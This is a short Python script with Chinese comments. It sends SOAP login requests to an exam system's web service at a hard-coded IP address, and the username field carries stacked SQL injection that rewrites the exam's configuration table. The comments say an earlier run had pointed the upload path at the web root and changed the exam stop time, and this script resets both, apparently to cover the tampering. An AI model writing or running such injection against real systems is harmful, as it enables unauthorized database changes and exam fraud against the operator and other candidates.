import requests

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def send_sql(desc, sql):
    print(f"[*] 执行: {desc}")
    injection = f"admin'; {sql}; --"
    safe_username = injection.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")

    soap = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <Login xmlns="http://tempuri.org/">
          <username>{safe_username}</username>
          <pwd>pass</pwd>
        </Login>
      </soap:Body>
    </soap:Envelope>"""

    try:
        requests.post(TARGET_URL, data=soap.encode('utf-8'), headers=HEADERS, timeout=5)
    except:
        pass

def restore_global_config():
    print("=== 全局配置恢复 (Config Recovery) ===")

    # 1. 恢复上传路径
    # 之前改成了 Web 根目录，现在恢复为默认值 F:\Exam2020
    sql_restore_path = r"UPDATE Exam2020Config SET Value='F:\Exam2020' WHERE Name='AnswerPath'"
    send_sql("恢复 AnswerPath 配置 (F:\\Exam2020)", sql_restore_path)

    # 2. 恢复考试时间
    # 恢复 StopTime 为 EndTime
    sql_restore_time = "UPDATE Exam2020Config SET Value=(SELECT Value FROM Exam2020Config WHERE Name='EndTime') WHERE Name='StopTime'"
    send_sql("恢复 StopTime (与 EndTime 一致)", sql_restore_time)

    print("\n[+] 全局配置已恢复。其他考生无法再上传文件。")

if __name__ == "__main__":
    restore_global_config()
